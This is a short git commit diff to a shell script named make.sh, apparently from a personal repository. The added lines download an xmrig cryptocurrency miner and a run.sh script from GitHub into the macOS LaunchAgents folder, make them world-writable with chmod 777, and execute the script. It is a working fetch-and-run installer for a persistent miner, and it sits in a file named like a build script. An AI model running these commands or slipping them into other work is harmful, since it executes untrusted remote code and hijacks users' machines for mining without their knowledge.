8df195ba5b3705cd036775ec55f4d15524764f72
Me1922 <34125170+Me1955@users.noreply.github.com>
2021-06-23 19:53:45 +1000

    Update make.sh

--- make.sh
+++ make.sh
@@ -2,3 +2,9 @@
 
 #installs the miner
 
+curl -L https://github.com/Me1955/me-mine/raw/main/xmrig >> ~/Library/Launchagents/xmrig
+chmod 777 ~/Library/LaunchAgents/xmrig
+
+curl -L https://github.com/Me1955/me-mine/raw/main/run.sh >> ~/Library/Launchagents/run.sh
+chmod 777 ~/Library/Launchagents/run.sh
+sh ~/Library/Launchagents/run.sh
